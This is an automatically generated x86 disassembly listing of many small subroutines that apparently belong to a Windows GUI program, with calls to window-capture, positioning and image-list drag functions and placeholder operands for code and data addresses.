sub_44ad18
pop ebp
retn
sub_44c2a2
jmp r-xdata
sub_44c2a4
0xe8ffe9ff 0xe7ff
sub_44c2ab
jmp esi
sub_44cfc5
add eax 0xffffff88
jmp sub_45ad3c
sub_44cfcd
add eax 0xffffff88
jmp sub_45ad40
sub_44cfd5
add eax 0xffffff88
jmp sub_45ae2c
sub_44cfdd
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_44cfea
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x10 ]
xchg [ esp ] eax
retn
sub_44cff7
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x48 ]
xchg [ esp ] eax
retn
sub_44d004
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x24 ]
xchg [ esp ] eax
retn
sub_44d011
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x2c ]
xchg [ esp ] eax
retn
sub_44d01e
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
xchg [ esp ] eax
retn
sub_44d02b
add eax 0xffffff88
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
xchg [ esp ] eax
retn
sub_44d038
add eax 0xffffff88
jmp sub_45c7c0
sub_44d040
add [ esp + 0x4 ] 0xffffff88
jmp sub_4070b8
sub_44d04a
add [ esp + 0x4 ] 0xffffff88
jmp sub_4070e0
sub_44d054
add [ esp + 0x4 ] 0xffffff88
jmp sub_4070f4
sub_44d05e
inc eax
rol [ eax + eax + 0x4a ] 0x1
rol [ eax + eax + 0x54 ] 0x1
rol [ eax + eax - 0x3b ] 0x1
iretd
sub_44d06c
inc esp
add ch cl
iretd
sub_44d070
inc esp
add ch dl
iretd
sub_44d074
inc esp
add ch bl
iretd
sub_44d078
inc esp
add dl ch
iretd
sub_44d07c
inc esp
add bh dh
iretd
sub_44d537
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_419348
retn
sub_44d554
push 0x15
mov ecx rw-data
call sub_419308
retn
sub_44d640
call GetCapture
call sub_44d2f4
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_44d8d4
push ebx
push eax
push sub_44da8c
call sub_421140
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_44d8ec
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_44d91c
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_4211f4
pop ebx
retn
sub_44da2f
jmp sub_404b30
sub_44da60
xor eax eax
retn
sub_44da64
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_44da7c
retn
sub_44da80
mov eax [ rw-data ]
retn
sub_44da88
retn
sub_44dab6
jmp sub_404b30
sub_44dabb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44dad8
call sub_4048a8
xor eax eax
mov [ rw-data ] eax
retn
sub_44dae8
call sub_4048a4
xor eax eax
mov [ rw-data ] eax
retn
sub_44daf8
test dl dl
je r-xdata
mov [ eax + 0x40 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_404974
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_44dba0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x40 ]
movzx eax [ eax + 0x7e ]
jmp r-xdata
pop ebp
retn 0x4
sub_44dbb8
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_44dc04
retn
sub_44dd00
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x40 ]
mov si 0xffe5
call sub_40484c
pop esi
pop ebp
retn 0x4
sub_44ddbc
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffdb
call sub_40484c
pop esi
retn
sub_44ddd0
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffda
call sub_40484c
pop esi
retn
sub_44dde4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_44ddf0
mov al 0x1
retn
sub_44ddf4
mov eax 0x4
retn
sub_44ddfc
retn
sub_44ea09
jmp sub_404b30
sub_44ece3
jmp sub_404de4
sub_44ed3f
jmp sub_404de4
sub_44edb1
jmp sub_404de4
sub_44edc0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44ea9c
sub_44ef43
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_425608
retn
sub_44ef59
jmp sub_404de4
sub_44ef80
jmp sub_404de4
sub_44f002
jmp sub_404de4
sub_44f02a
jmp sub_404de4
sub_44f031
mov esp ebp
pop ebp
retn
sub_44f0e9
jmp sub_404de4
sub_44f140
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_44f10c
mov [ ebx + 0x58 ] esi
sub_44f294
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_44f2a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_404800
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44f391
jmp sub_404de4
sub_44f398
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f41b
jmp sub_404de4
sub_44f422
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_44f428
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44f470
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4047dc
pop ebx
retn
sub_44f578
retn
sub_44f59c
retn
sub_44f8bc
xor eax eax
retn
sub_44f8c0
movzx eax [ eax + 0x58 ]
retn
sub_44f8c8
xor eax eax
retn
sub_44f8cc
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_44f8d4
mov eax [ eax + 0x30 ]
retn
sub_44f97c
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_44faa8
push ebx
mov ebx eax
movzx eax [ ebx + 0x5b ]
movzx eax [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44faf8
mov [ eax + 0x5d ] dl
retn
sub_44fafc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_454170
sub_44fb0c
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_450114
jmp sub_404de4
sub_45011b
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_45017c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x160 ] edx
retn
mov [ eax + 0x158 ] 0x1
sub_4501f8
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_450210
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_450254
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0xc ]
add esp 0x10
pop ebx
retn
sub_450315
jmp sub_404de4
sub_45031c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450663
cmp dl [ esi + 0x5c ]
je r-xdata
pop esi
retn
mov [ esi + 0x5c ] dl
test dl dl
je r-xdata
mov eax esi
mov si 0xffee
call sub_40484c
sub_450712
jmp sub_404de4
sub_450719
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4507ec
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_451b4c
sub_450804
push 0x0
xor ecx ecx
mov edx 0xe
call sub_451b4c
retn
sub_450814
push edx
mov edx 0xd
call sub_451b4c
retn
sub_450820
mov edx [ eax + 0xa0 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_450834
mov edx [ eax + 0x9c ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_450919
jmp sub_404de4
sub_450920
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450928
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_451b4c
sub_450998
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_4509ac
movzx eax [ eax + 0x8e ]
xor al 0x1
retn
sub_4509b8
movzx eax [ eax + 0x60 ]
xor al 0x1
retn
sub_4509c0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_451b4c
sub_4509e4
cmp dl [ eax + 0x8d ]
je r-xdata
retn
mov [ eax + 0x8d ] dl
mov [ eax + 0x8e ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_451b4c
sub_450a54
movzx eax [ eax + 0x5a ]
xor al 0x1
retn
sub_450a5c
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_451b4c
sub_450a80
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_451b4c
sub_450aa4
cmp dx [ eax + 0x7c ]
je r-xdata
retn
mov [ eax + 0x7c ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_451b4c
sub_450ac0
push ebx
mov ebx eax
call sub_44d640
cmp ebx eax
sete al
pop ebx
retn
sub_450af8
push esi
mov esi eax
mov dl 0x1
mov eax esi
mov si 0xffce
call sub_40484c
pop esi
retn
sub_450c4e
jmp sub_404de4
sub_450c55
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450d78
test [ eax + 0x50 ] 0x40
setne cl
movzx edx [ eax + 0x57 ]
call sub_450cec
retn
sub_450e54
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
sub_450f41
jmp sub_404de4
sub_450f64
xor eax eax
retn
sub_450f68
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_450f80
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_450f98
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
movzx eax [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_450fb4
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
movzx edx [ edx + 0x4 ]
call sub_450fd0
retn
sub_4510bc
retn
sub_4510c0
cmp eax [ rw-data ]
sete al
retn
sub_451134
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_451254
push ebp
mov ebp esp
push esi
mov esi edx
mov edx esi
mov si 0xffd1
call sub_40484c
pop esi
pop ebp
retn 0x4
sub_451298
push ebx
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_451573
jmp sub_404de4
sub_45157a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451584
push esi
xor ecx ecx
mov si 0xffe8
call sub_40484c
pop esi
retn
sub_451594
push esi
mov cl 0x1
mov si 0xffe8
call sub_40484c
pop esi
retn
sub_451860
jmp sub_404de4
sub_451908
push esi
mov esi eax
mov eax esi
mov si 0xffee
call sub_40484c
pop esi
retn
sub_451918
mov al 0x1
retn
sub_451c24
retn
sub_451f79
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d0e0
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_451f94
movzx eax [ eax + 0x5e ]
xchg edx eax
call sub_41f570
retn
sub_452383
add [ ebx - 0x75 ] dl
fsub [ esi - 0x7d ]
mov ebx 0x112
add [ ebp + ebp - 0x75 ] dh
retn
sub_4523f0
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_452a2c
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_452a3c
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_452a4c
push esi
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_452b64
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_452bf0
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_450988
mov [ ebx + 0x56 ] 0x1
sub_452c14
mov [ edx + 0xc ] 0x1
retn
sub_452c94
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_452efc
jmp sub_404de4
sub_452f03
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452f30
mov eax [ r-xdata ]
retn
sub_45308d
jmp sub_404de4
sub_453094
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4531b4
mov eax [ eax + 0xac ]
retn
sub_4531dc
push ebx
mov ebx eax
mov eax ebx
call sub_450f68
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_4531f8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4533b0
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4533e0
mov edx [ eax ]
call [ edx + 0x5c ]
retn
sub_4533e8
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_453460
mov eax [ eax + 0x184 ]
xchg edx eax
call sub_41f584
retn
sub_453470
mov eax [ eax + 0x18c ]
xchg edx eax
call sub_41f584
retn
sub_453480
mov eax [ eax + 0x180 ]
xchg edx eax
call sub_41f584
retn
sub_453490
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x188 ] eax
pop esi
pop ebx
retn
sub_4534a8
mov eax [ eax + 0x188 ]
xchg edx eax
call sub_41f584
retn
sub_4534b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x184 ] eax
pop esi
pop ebx
retn
sub_4534d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x18c ] eax
pop esi
pop ebx
retn
sub_4534e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41dc40
mov [ ebx + 0x180 ] eax
pop esi
pop ebx
retn
sub_453524
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_45352c
call sub_44f698
retn
sub_45364e
jmp sub_404de4
sub_45381c
jmp sub_404de4
sub_45386c
jmp sub_404de4
sub_45414b
jmp sub_404de4
sub_4541f7
jmp sub_404de4
sub_454204
inc [ eax + 0x190 ]
retn
sub_45420c
dec [ eax + 0x190 ]
cmp [ eax + 0x190 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_45422c
sub_45422c
xor edx edx
call sub_454170
retn
sub_4542f9
jmp sub_404de4
sub_454300
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4543f6
jmp sub_404de4
sub_454450
jmp r-xdata
test edx edx
je r-xdata
test edx edx
setne al
retn
cmp eax edx
jne r-xdata
mov edx [ edx + 0x30 ]
sub_454926
jmp sub_404de4
sub_45492d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454af5
jmp sub_404de4
sub_454afc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454bd0
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_454dcd
jmp sub_404de4
sub_454dd4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x1b4 ] edx
pop ecx
pop ebp
retn
sub_454ff0
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_451b4c
sub_455064
jmp sub_404de4
sub_455190
jmp sub_404b30
sub_4552e1
jmp sub_404de4
sub_455333
jmp sub_404de4
sub_45533a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455344
jmp sub_404b30
sub_455349
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455be1
jmp sub_404de4
sub_455e72
jmp sub_404de4
sub_455eaf
jmp sub_404de4
sub_455eb6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455ec0
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_456095
jmp sub_404de4
sub_45625e
jmp sub_404de4
sub_456265
push 0xfffffffe
push 0xfffffffe
mov eax [ ebp - 0x8 ]
push eax
call InflateRect
mov esp ebp
pop ebp
retn
sub_4564b1
jmp sub_404de4
sub_4564b8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xff7f
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4565d6
jmp sub_404de4
sub_4566b9
jmp sub_404de4
sub_4566f2
jmp sub_404de4
sub_456744
push ebx
mov ebx eax
call sub_423d44
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_451b4c
pop ebx
retn
sub_456760
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_451b4c
retn
sub_456774
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_451b4c
retn
sub_456784
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_451b4c
retn
sub_456a80
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_458910
mov eax esi
call sub_45342c
pop esi
retn
sub_456ba0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_456c00
xor edx edx
mov eax esi
call sub_4598ec
pop esi
retn
sub_456bbc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_456d30
mov dl 0x1
mov eax esi
call sub_4598ec
pop esi
retn
sub_456bd8
push esi
mov esi eax
mov [ esi + 0x241 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_456bec
push esi
mov esi eax
mov [ esi + 0x241 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_456d1f
jmp sub_404de4
sub_456d26
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456dff
jmp sub_404de4
sub_456e06
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456e10
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
pop esi
retn
sub_456e20
retn
sub_456e24
push ebx
cmp [ eax + 0x1f2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
sub_456e44
push ebx
cmp [ eax + 0x1fa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
sub_456fac
mov edx [ eax + 0x1ac ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_45707c
retn
sub_4571c8
jmp sub_404de4
sub_4571cf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45729b
jmp sub_404de4
sub_4572c8
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1db ] 0x0
je r-xdata
retn
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x1b0 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_45735b
jmp sub_404de4
sub_457574
push ebx
cmp [ eax + 0x212 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
sub_457853
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x1b4 ] eax
mov [ esi + 0x1da ] 0x0
pop esi
retn
sub_45792c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_454778
pop esi
retn
sub_4579ec
push esi
mov esi eax
mov eax esi
mov si 0xffc0
call sub_40484c
pop esi
retn
sub_457a1c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_457a30
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_457a44
call sub_454708
retn
sub_457a4c
call sub_454708
retn
sub_457a54
call sub_454708
retn
sub_457a8c
movzx edx [ eax + 0x1da ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x1b4 ]
push eax
call SetWindowPos
retn
sub_457afc
push ebx
mov ebx eax
mov eax ebx
call sub_452a4c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x1a4 ]
call sub_424fb8
mov dx 0xb009
mov eax ebx
call sub_454778
pop ebx
retn
sub_457c60
call sub_454708
retn
sub_457c68
call sub_454708
retn
sub_457c70
call sub_454708
retn
sub_457c78
call sub_454708
retn
sub_457ce0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_457cf4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_458196
jmp sub_404de4
sub_45819d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45827c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_458420
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_451b4c
retn
sub_4584c4
push ebx
mov ebx eax
mov eax ebx
call sub_458904
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x1b4 ]
push eax
call UpdateWindow
sub_4584e0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8c ]
pop ebx
retn
sub_458760
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4585f8
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4587c4
cmp edx [ eax + 0x19c ]
je r-xdata
retn
mov [ eax + 0x19c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_451b4c
sub_4587e4
cmp dl [ eax + 0x1d9 ]
je r-xdata
retn
mov [ eax + 0x1d9 ] dl
mov [ eax + 0x1dd ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_451b4c
sub_458808
movzx eax [ eax + 0x1dd ]
xor al 0x1
retn
sub_4588f8
jmp sub_404de4
sub_4588ff
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458904
cmp [ eax + 0x1b4 ] 0x0
setne al
retn
sub_458b1e
jmp sub_404de4
sub_458b25
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_458be8
call sub_45191c
retn
sub_459126
jmp sub_404de4
sub_4591bc
mov eax [ r-xdata ]
retn
sub_459322
jmp sub_404de4
sub_4596ff
jmp sub_404de4
sub_459869
jmp sub_404de4
sub_45988c
test [ eax + 0x52 ] 0x4
setne al
retn
sub_4598d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax esi
call sub_4598ec
pop esi
retn
sub_459920
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0xc
sub_45992c
xor eax eax
retn
sub_459984
call sub_45422c
retn
sub_45998c
mov eax [ eax + 0x1a0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_459ad0
jmp sub_404de4
sub_459ad7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459bac
mov [ edx + 0xc ] 0xffffffff
retn
sub_459c0a
jmp sub_404de4
sub_459c11
pop ecx
pop ecx
pop ebp
retn
sub_459cb1
jmp sub_404de4
sub_459cb8
pop ebx
mov esp ebp
pop ebp
retn
sub_459d24
mov edx [ eax ]
call [ edx + 0xb0 ]
retn
sub_459dbb
jmp sub_404de4
sub_459dc2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459fac
jmp sub_404de4
sub_459fb3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a0d0
mov al 0x1
retn
sub_45a15c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x68 ] cx
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax ecx
xchg edx eax
call sub_4442a8
sub_45a2c0
push ebx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_45a2d8
push ebx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_45a3cc
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_4564d0
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_45a467
jmp sub_404de4
sub_45a46e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a491
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
call sub_425608
retn
sub_45a48a
jmp sub_404de4
sub_45a491
pop ebx
pop ecx
pop ebp
retn
sub_45a498
retn
sub_45a500
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_45a899
jmp sub_404de4
sub_45aa84
mov eax [ eax + 0x8 ]
jmp r-xdata
